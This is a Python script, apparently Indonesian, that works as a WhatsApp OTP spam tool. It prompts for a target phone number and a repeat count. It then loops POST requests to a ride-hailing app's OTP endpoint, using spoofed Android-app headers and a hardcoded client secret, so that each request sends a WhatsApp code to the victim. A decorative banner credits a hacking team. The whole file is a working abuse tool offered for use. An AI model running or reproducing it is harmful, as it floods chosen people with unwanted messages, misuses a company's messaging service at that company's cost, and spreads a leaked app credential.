import os,sys,time,os,json,requests,json
from colorama import Fore,Back,init
from requests import get,post
from urllib import request

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
visitor=request.urlopen('https://api.countapi.xyz/hit/spammer-wa')
getvisit=json.loads(visitor.read())
localtime=time.asctime(time.localtime(time.time()))

hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

autoketik(f"""

{hijau}╭━━━┳━━━┳━━━┳━╮╭━┳━╮╭━┳━━━┳━━━╮{biru}╱╭━━━┳━━━━┳━━━╮
{hijau}┃╭━╮┃╭━╮┃╭━╮┃┃╰╯┃┃┃╰╯┃┃╭━━┫╭━╮┃{biru}╱┃╭━╮┃╭╮╭╮┃╭━╮┃
{hijau}┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃╭╮╭╮┃╰━━┫╰━╯┃{biru}╱┃┃╱┃┣╯┃┃╰┫╰━╯┃
{hijau}╰━━╮┃╭━━┫╰━╯┃┃┃┃┃┃┃┃┃┃┃╭━━┫╭╮╭┻{biru}━┫┃╱┃┃╱┃┃╱┃╭━━╯
{hijau}┃╰━╯┃┃╱╱┃╭━╮┃┃┃┃┃┃┃┃┃┃┃╰━━┫┃┃╰┳{biru}━┫╰━╯┃╱┃┃╱┃┃
{hijau}╰━━━┻╯╱╱╰╯╱╰┻╯╰╯╰┻╯╰╯╰┻━━━┻╯╰━╯{biru}╱╰━━━╯╱╰╯╱╰╯
{abu}-----------------------------------------
{putih}[{biru}+{putih}] {biru}Author {putih}   : Tengku Arya Saputra
{putih}[{biru}+{putih}] {abu}GitHub {putih}   : AryaSec1337
{putih}[{biru}+{putih}] {merah}Team {putih}     : Dark Clown Security
{putih}[{biru}+{putih}] {ungu}Instagram {putih}: @arryyaa_17
{W}[{biru}+{W}] Ip Kamu {putih}  :{hijau} {ip}
{W}[{biru}+{W}] Waktu/Jam {putih}:{hijau} {localtime}
{W}[{biru}+{W}] Total Run {putih}:{hijau} {getvisit['value']}
""")

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: +62")
jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
for i in range(jum):
    pos = requests.post("https://api-v2.trevo.my/common-users/otp/whatsapp",headers={"Host":"api-v2.trevo.my","Accept":"application/json","Cache-Control":"no-cache","X-App-Version":"3.5.3","X-App":"trevo","X-Country-Code":"ID","X-Platform":"android","X-Appsflyer-Id":"1681353044329-5958541001121242825","Content-Type":"application/json","Content-Length":"133","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/3.12.12","Connection":"close"},data=json.dumps({"clientId":"trevo","clientSecret":"gukEsPewA7aSWiboP0edr2FIb0ePhizisAwRofr4SicaFriB","language":"id","phoneNumber":"+62"+nomor})).text
    print (f"{W}[{G}✓{W}] Success Sended Spam")
